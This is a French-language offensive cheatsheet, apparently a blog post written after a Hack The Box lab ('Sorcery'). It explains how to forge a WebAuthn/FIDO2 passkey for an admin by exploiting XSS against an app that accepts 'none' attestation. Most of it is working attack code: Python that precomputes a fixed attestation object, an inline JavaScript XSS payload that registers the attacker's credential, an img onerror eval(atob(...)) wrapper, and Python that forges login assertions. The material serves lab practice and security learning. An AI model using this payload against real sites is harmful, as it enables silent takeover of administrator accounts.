---
title: "WebAuthn/FIDO2 Passkey Forgery"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Si une app utilise WebAuthn (FIDO2) et qu'on a un XSS dans le contexte d'un admin, on peut **enregistrer notre propre passkey** pour l'admin sans interaction utilisateur."
summary: "WebAttacks | WebAuthn/FIDO2 Passkey Forgery"
tags:
  - "Web"
  - "OWASP"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "WebAttacks"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## Concept
Si une app utilise WebAuthn (FIDO2) et qu'on a un XSS dans le contexte d'un admin, on peut **enregistrer notre propre passkey** pour l'admin sans interaction utilisateur.

## Prérequis
- XSS dans le même origin que l'app WebAuthn
- L'admin bot visite la page avec un JWT qui autorise les endpoints WebAuthn register
- Le format d'attestation est "none" (pas de vérification hardware)

## Technique : Attestation "none" inline

L'attestation "none" ne contient PAS de signature crypto sur le challenge côté client.
Seul `clientDataJSON` change (contient le challenge en clair).
Le `attestationObject` est **fixe** et pré-calculable.

### Pré-calcul (Python)
```python
import cbor2, hashlib, struct, base64, os
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

# Générer une clé EC P-256
pk = ec.generate_private_key(ec.SECP256R1(), default_backend())
pub = pk.public_key().public_numbers()
cred_id = os.urandom(32)

def b64u(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

# attestationObject (FIXE, ne dépend pas du challenge)
rp_hash = hashlib.sha256(b"target.htb").digest()
cose = cbor2.dumps({1:2,3:-7,-1:1,-2:pub.x.to_bytes(32,'big'),-3:pub.y.to_bytes(32,'big')})
ac = b'\x00'*16 + struct.pack('>H',len(cred_id)) + cred_id + cose
ext = cbor2.dumps({"credProtect":2})
ad = rp_hash + struct.pack('B',0xC5) + struct.pack('>I',0) + ac + ext
ao = cbor2.dumps({"fmt":"none","attStmt":{},"authData":ad})

AO_B64 = b64u(ao)       # Fixe!
CRED_B64 = b64u(cred_id) # Fixe!
```

### Payload XSS inline (JavaScript)
```javascript
(async function(){
  // 1. startRegistration → get challenge
  var r1 = await fetch(window.location.href, {
    method:'POST',
    headers:{'Next-Action':'<START_REG_ID>','Content-Type':'text/plain'},
    body:'["admin"]'
  });
  var ch = r1.text().match(/"challenge":"([^"]+)"/)[1];

  // 2. clientDataJSON (seul élément dynamique)
  var cd = JSON.stringify({type:"webauthn.create",challenge:ch,origin:"https://target.htb",crossOrigin:false});
  var cdb = btoa(cd).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');

  // 3. finishRegistration avec attestation pré-calculée
  var cred = {
    id:"<CRED_B64>", rawId:"<CRED_B64>",
    response:{attestationObject:"<AO_B64>", clientDataJSON:cdb},
    type:"public-key",
    clientExtensionResults:{credProps:{rk:false}},
    authenticatorAttachment:"cross-platform"
  };
  await fetch(window.location.href, {
    method:'POST',
    headers:{'Next-Action':'<FINISH_REG_ID>','Content-Type':'text/plain'},
    body:JSON.stringify([cred])
  });
})()
```

### Embedding dans `<img onerror>`
```html
<img src=x onerror="eval(atob('<BASE64_DU_JS>'))">
```

## Authentification post-registration (Python)
```python
def assertion(challenge, counter):
    rp_hash = hashlib.sha256(b"target.htb").digest()
    ad = rp_hash + struct.pack('B',0x05) + struct.pack('>I',counter)
    cd = json.dumps({"type":"webauthn.get","challenge":challenge,
                     "origin":"https://target.htb","crossOrigin":False},
                    separators=(',',':')).encode()
    sig = pk.sign(ad + hashlib.sha256(cd).digest(), ec.ECDSA(hashes.SHA256()))
    return {
        "id": b64u(cred_id), "rawId": b64u(cred_id),
        "response": {
            "authenticatorData": b64u(ad),
            "clientDataJSON": b64u(cd),
            "signature": b64u(sig),
            "userHandle": ""
        },
        "type": "public-key"
    }
```

## Ref
- Machine: Sorcery (HTB Insane)
- Le bot headless Chrome ne pouvait pas joindre notre IP → tout inline
